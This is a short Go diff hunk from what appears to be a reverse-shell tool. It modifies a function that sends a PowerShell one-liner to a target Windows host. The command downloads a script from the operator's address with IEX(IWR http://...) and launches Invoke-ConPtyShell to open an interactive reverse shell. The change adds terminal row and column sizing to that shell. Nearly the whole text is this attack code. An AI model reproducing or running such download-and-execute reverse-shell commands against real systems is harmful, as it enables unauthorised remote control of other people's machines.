@@ -252,7 +252,8 @@ func (terminal *Terminal) interactiveReverseShellLinux() {
 }
 
 func (terminal *Terminal) interactiveReverseShellWindows() {
-	command := `IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1]
+	terminal.getTerminalSize()
+	command := `powershell IEX(IWR http://` + terminal.Con.LocalAddr().String() + ` -UseBasicParsing); Invoke-ConPtyShell ` + strings.Split(terminal.Con.LocalAddr().String(), ":")[0] + " " + strings.Split(terminal.Con.LocalAddr().String(), ":")[1] + " -Rows " + terminal.rows + " -Cols " + terminal.cols
 	terminal.log.Debug("Send the command: " + command)
 	terminal.execute(command)
 	terminal.Con.Close()
